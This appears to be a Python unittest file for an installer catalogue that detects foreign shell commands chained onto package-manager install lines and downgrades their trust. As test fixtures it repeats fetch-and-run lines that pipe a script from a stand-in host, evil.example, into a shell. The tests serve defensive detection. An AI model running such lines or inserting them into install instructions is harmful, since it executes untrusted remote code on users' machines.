import unittest

from tuistore import installer
from tuistore.installer import foreign_segments, make
from tuistore.scrape import extract_methods


class ForeignSegmentTest(unittest.TestCase):
    def test_manager_only_chain_has_no_foreign_segments(self) -> None:
        # Real shipped catalog commands — two-step update-then-install
        # lines must stay green.
        commands = [
            "sudo apt update && sudo apt install glow",
            "brew tap AppachiTech/suvadu && brew install suvadu",
            "sudo zypper ref && sudo zypper in lazygit",
            "sudo dnf copr enable atim/gping -y && sudo dnf install gping",
            "scoop bucket add main && scoop install main/topgrade",
        ]
        for command in commands:
            with self.subTest(command=command):
                self.assertEqual(foreign_segments(command), [])

    def test_curl_pipe_sh_prefix_is_foreign(self) -> None:
        self.assertEqual(
            foreign_segments("curl -s http://evil.example/x.sh | sh && brew install lazygit"),
            ["curl -s http://evil.example/x.sh", "sh"],
        )

    def test_trailing_command_after_install_verb_is_foreign(self) -> None:
        # classify() only ever looked at the text *before* the install
        # verb; a command chained on *after* it is invisible to that gate
        # entirely, which is exactly the gap this function closes.
        self.assertTrue(
            foreign_segments("brew install lazygit; curl http://evil.example|sh")
        )

    def test_env_and_sudo_wrappers_are_stripped_before_judging(self) -> None:
        # Judged on "apt", not on "env"/"sudo".
        self.assertEqual(foreign_segments("env FOO=1 sudo apt install glow"), [])

    def test_curl_and_git_are_not_treated_as_package_managers(self) -> None:
        # Catches a future edit that adds "script"/"source" back into the
        # MANAGER_BINARIES comprehension — their `requires` (curl, git) are
        # exactly the tools a hostile chained command would use.
        self.assertNotIn("curl", installer.MANAGER_BINARIES)
        self.assertNotIn("git", installer.MANAGER_BINARIES)


class ChainedCommandTrustTest(unittest.TestCase):
    def test_readme_method_with_foreign_chain_is_not_community(self) -> None:
        m = make(
            "brew",
            "curl -s http://evil.example/x.sh | sh && brew install lazygit",
            source="readme",
        )
        self.assertEqual(m.trust, "unverified")

    def test_official_method_with_foreign_chain_is_not_verified(self) -> None:
        # A maintainer-curated row is not a licence to chain arbitrary shell.
        m = make(
            "brew",
            "curl -s http://evil.example/x.sh | sh && brew install lazygit",
            source="official",
        )
        self.assertEqual(m.trust, "unverified")

    def test_clean_readme_method_stays_community(self) -> None:
        m = make("apt", "sudo apt update && sudo apt install glow", source="readme")
        self.assertEqual(m.trust, "community")
        self.assertEqual(m.foreign_commands, [])

    def test_script_kind_keeps_its_own_warning_and_trust(self) -> None:
        # Already covered by the louder remote-script banner — must not be
        # double-flagged.
        m = make(
            "script",
            "curl -fsSL https://starship.rs/install.sh | sh",
            source="readme",
        )
        self.assertEqual(m.foreign_commands, [])
        self.assertTrue(m.is_script)
        self.assertEqual(m.trust, "community")

    def test_source_clone_is_not_flagged(self) -> None:
        m = make("source", "git clone https://github.com/a/b && cd b")
        self.assertEqual(m.foreign_commands, [])

    def test_scraped_attack_line_is_flagged_end_to_end(self) -> None:
        readme = """```sh
curl -s http://evil.example/x.sh | sh && brew install lazygit
```"""
        methods = extract_methods(readme, "https://github.com/jesseduffield/lazygit")

        self.assertEqual(len(methods), 1)
        method = methods[0]
        self.assertEqual(method.kind, "brew")
        self.assertEqual(method.trust, "unverified")
        self.assertTrue(method.foreign_commands)


if __name__ == "__main__":
    unittest.main()
